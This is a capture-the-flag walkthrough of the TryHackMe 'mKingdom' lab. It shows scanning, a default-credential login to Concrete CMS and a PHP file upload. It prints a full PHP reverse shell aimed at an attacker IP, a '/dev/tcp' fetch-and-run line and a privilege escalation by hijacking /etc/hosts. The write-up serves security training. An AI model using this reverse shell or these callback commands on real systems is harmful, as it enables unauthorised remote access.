# mKingdom

<figure><img src="../../../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://tryhackme.com/r/room/mkingdom" %}

> **Reconnaissance**

```
nmap -sC -sV -Pn -T4 10.10.x.x
```

<figure><img src="../../../../../.gitbook/assets/image (383).png" alt=""><figcaption></figcaption></figure>

**I see that Port 85 work web service** `http://10.10.x.x:85/`



<figure><img src="../../../../../.gitbook/assets/image (385).png" alt=""><figcaption></figcaption></figure>

I use gobuster to Fuzzing dir

{% code overflow="wrap" %}
```bash
gobuster dir  -u http://10.10.112.62:85/ --wordlist=/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt 
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/image (386).png" alt=""><figcaption></figcaption></figure>



i Found  /app (Status: 301) \[Size: 312] \[--> **`http://10.10.112.62:85/app/`**]

when scroll down i found login page and i use Wayyplazer found CMS Concrete => V8.5.2

#### File Upload code

{% hint style="danger" %}
There’s an existing RCE vulnerability in Concrete CMS 8.5.2.

i use Revers shell online [https://www.revshells.com/](https://www.revshells.com/)

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.21.32.157';
$port = 9001;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?>

```
{% endhint %}

<figure><img src="../../../../../.gitbook/assets/image (387).png" alt=""><figcaption></figcaption></figure>

when scroll in web site i found username "admin" in /blog&#x20;

<figure><img src="../../../../../.gitbook/assets/image (388).png" alt=""><figcaption></figcaption></figure>

I tried to login with ‘**`admin`**’ as username and random passwords, and to my surprise, ‘**`password`**’ worked!

> Initial  Access

According to instructions, I navigated to **System & Settings-> Allowed** file types, and added ‘.**php**’ in the allowed file types.

<figure><img src="../../../../../.gitbook/assets/image (389).png" alt=""><figcaption></figcaption></figure>

Then I went to Files -> File Manager and uploaded a php reverse shell. I started a Netcat listener on my attacking machine. After uploading the shell, I accessed it from the link provided on the website.

\


<figure><img src="../../../../../.gitbook/assets/image (390).png" alt=""><figcaption></figcaption></figure>

I using reverse shell nc

```bash
nc -nvlp 9001
```

in click URL to File\


<figure><img src="../../../../../.gitbook/assets/image (391).png" alt=""><figcaption><p>Revers shell</p></figcaption></figure>

> Priv Esc

To Upgrade the tty&#x20;

```bash
python -c 'import pty;pty.spawn("/bin/bash");'  
ctrl z  
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;

```

<figure><img src="../../../../../.gitbook/assets/image (393).png" alt=""><figcaption></figcaption></figure>

I will try Useing **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

```bash
sudo nc  -lvnp 443 < linpeas.sh #Host
cat < /dev/tcp/10.21.32.157/443 | sh #Victim
```

<figure><img src="../../../../../.gitbook/assets/image (394).png" alt=""><figcaption></figcaption></figure>

i found DB.php

<figure><img src="../../../../../.gitbook/assets/image (395).png" alt=""><figcaption></figcaption></figure>

```
<?php

return [
    'default-connection' => 'concrete',
    'connections' => [
        'concrete' => [
            'driver' => 'c5_pdo_mysql',
            'server' => 'localhost',
            'database' => 'mKingdom',
            'username' => 'toad',
            'password' => 'toadisthebest',
            'character_set' => 'utf8',
            'collation' => 'utf8_unicode_ci',
        ],
    ],
];

```

<figure><img src="../../../../../.gitbook/assets/image (396).png" alt=""><figcaption></figcaption></figure>

I logged in as **toad**. After a bit of looking around, I listed the current environment variables using ‘**env**’, and I found a **PWD\_token.**

<figure><img src="../../../../../.gitbook/assets/image (397).png" alt=""><figcaption></figcaption></figure>

```bash
echo "aWthVGVOVEFOdEVTCg==" | base64  -d
or 
base64 -d <<< aWthVGVOVEFOdEVTCg==
```

user : mario&#x20;

pass : ikaTeNTANtES

<figure><img src="../../../../../.gitbook/assets/image (398).png" alt=""><figcaption></figcaption></figure>

But i don't cat the flag

<figure><img src="../../../../../.gitbook/assets/image (399).png" alt=""><figcaption></figcaption></figure>

i will move file to /tmp&#x20;

<figure><img src="../../../../../.gitbook/assets/image (404).png" alt=""><figcaption></figcaption></figure>

I ran linpeas again as mario, and found that /etc/hosts is writable

<figure><img src="../../../../../.gitbook/assets/image (401).png" alt=""><figcaption></figcaption></figure>

> **curl mkingdom.thm:85/app/castle/application/counter.sh**

I modified the /etc/hosts file to add my **attacking machine IP** and **mkingdom.thm** as the corresponding hostname. Then I created the folder path /app/castle/application on my attacking machine and placed counter.sh there with a reverse shell payload.

<figure><img src="../../../../../.gitbook/assets/image (402).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

> Exploit Used

* **Reverse shell (File Upload)** [#file-upload-code](mkingdom.md#file-upload-code "mention")



> Tools Used

* Nmap&#x20;
* nc
* gobuseter
* linpeas.sh

#### Other Resources <a href="#r" id="r"></a>

{% embed url="https://vulners.com/hackerone/H1:768322" %}

{% embed url="https://hackerone.com/reports/768322" %}

{% embed url="https://www.revshells.com/" %}
